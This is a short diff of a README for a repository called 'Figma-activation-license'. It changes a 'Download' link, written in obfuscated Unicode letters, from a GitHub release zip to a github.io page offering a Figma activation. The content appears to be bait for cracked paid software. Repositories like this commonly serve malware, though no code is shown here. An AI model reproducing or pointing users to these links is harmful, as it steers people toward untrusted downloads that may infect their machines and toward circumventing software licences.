@@ -1,5 +1,5 @@
 
-## 📁 [𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/XBLU18/Figma-2024/releases/download/Figma-2024/Figma-2024.zip)
+## 📁 [𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://felixashong.github.io/FIGMA-ACTIVATION-2024/)
 
 # 🔑 Figma-activation-license
 
